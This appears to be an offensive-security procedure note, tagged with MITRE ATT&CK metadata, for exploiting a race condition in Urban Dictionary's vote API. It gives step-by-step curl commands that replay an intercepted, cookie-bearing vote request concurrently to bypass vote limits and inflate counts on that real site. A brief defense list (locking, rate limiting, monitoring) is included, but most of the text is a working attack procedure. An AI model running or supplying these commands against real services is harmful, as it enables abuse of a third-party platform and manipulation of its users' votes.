---
id: proc-parallel-curl-001
tags:
  - race-condition
  - parallel-execution
  - curl-replay
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/parallel-curl-vote-execution]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:18.891Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Execute Parallel Curl Votes

## Summary

This procedure replays the intercepted vote request multiple times concurrently using curl in a terminal, exploiting the lack of synchronization in the backend to bypass vote limits and inflate counts.

## Description

The race condition arises from asynchronous request processing without locking. By running curl commands in parallel (e.g., via & operator), multiple votes register before checks enforce limits. Prerequisites: Intercepted curl from Step 2, reset from Step 3. Target: Linux/Mac terminal. Outcomes: Multiple votes applied, visible after refresh.

## Requirements

1. Terminal with curl installed
2. Intercepted curl command
3. Network access to Urban Dictionary

## Defense

Defensive measures and detection strategies:

- Add mutex/locking in vote processing
- Rate limit concurrent requests per IP/session
- Monitor for parallel request bursts

## Objectives

1. Trigger race condition for limit bypass
2. Accumulate arbitrary votes
3. Achieve concurrent processing exploitation

## Instructions

### Step 1: Prepare Curl Command

**Context**: Use the exported curl from interception, ensuring it includes all headers and data.

Example base command (replace with actual):

```bash
curl -X POST -H "Cookie: session=abc" -H "X-Requested-With: XMLHttpRequest" -d "vote=up&defid=123" https://www.urbandictionary.com/api/vote
```

> Verify single execution works by running once.

### Step 2: Run in Parallel

**Context**: Execute twice (or more) concurrently to simulate race.

Execute [[commands/parallel-curl-vote-execution]]:

```bash
(curl -X POST -H "Cookie: session=abc" -H "X-Requested-With: XMLHttpRequest" -d "vote=up&defid=123" https://www.urbandictionary.com/api/vote ) & (curl -X POST -H "Cookie: session=abc" -H "X-Requested-With: XMLHttpRequest" -d "vote=up&defid=123" https://www.urbandictionary.com/api/vote )
```

> Both processes run simultaneously; wait for completion with `wait`. Expect no errors, multiple votes registered.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/parallel-curl-vote-execution]]

## Tools Used


## Tags

- race-condition
- parallel-execution
- curl-replay
